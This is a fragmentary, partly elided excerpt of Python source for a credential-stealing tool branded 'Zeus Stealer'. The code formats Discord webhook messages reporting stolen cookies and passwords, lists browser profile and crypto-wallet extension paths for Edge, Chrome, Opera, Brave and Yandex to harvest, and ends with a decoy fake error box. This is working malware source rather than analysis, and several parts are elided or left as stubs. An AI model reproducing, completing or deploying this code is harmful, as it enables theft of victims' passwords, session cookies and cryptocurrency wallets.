...
def uploadToken(token, path):
    ...
    if pfp == None: 
        ...
        pfp = "https://cdn.discordapp.com/attachments/940925113837170692/1071361790706978846/786713106658492416.webp"
    ...
    data = {
...

		{
            ...
            "footer": {
                ...
                "icon_url": "https://cdn.discordapp.com/attachments/940925113837170692/1071361790706978846/786713106658492416.webp"
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/940925113837170692/1071361790706978846/786713106658492416.webp",


        "username": "Zeus Stealer",
        ...
        data = {
            ...
            "embeds": [
...

                {
                    ...
                    "title": "Zeus | Cookies Stealer",


                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [ZeusCookies.txt]({link})",
        ...
        data = {
            ...
            "embeds": [
...

                {
                    ...
                    "title": "Zeus | Password Stealer",


                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [ZeusPassword.txt]({link})",
...
def ZipThings(path, arg, procc):
    ...
    if "acmacodkjbdgmoleebolmdjonilkdbch" in arg:


        browser = path.split("\\")[4].split("/")[1].replace(' ', '')


        name = f"Rabby{browser}"
    ...
    if "Wallet" in arg or "NationsGlory" in arg:
        ...
        # Add any logic here to handle this case
...
def GatherAll():
    ...
    browserPaths = [
        ...
        [f"{local}/Microsoft/Edge/User Data",                       "msedge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        ...
        [f"{local}/Microsoft/Edge/User Data",                       "msedge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],


		[f"{local}/Microsoft/Edge/User Data",                       "msedge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        ...
        [f"{local}/Microsoft/Edge/User Data",                       "msedge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],


		[f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch"                      ],


        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch"                      ],


        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch"                      ],


        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch"              ],


        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch"              ],


        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch"              ],


        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/acmacodkjbdgmoleebolmdjonilkdbch"                                    ],


        [f"{local}/Microsoft/Edge/User Data",                       "msedge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch"              ]
...
MessageBox(None, 'YOU CAN TYPE HERE YOUR MESSAGE ERROR', 'APPS NAME', 0)
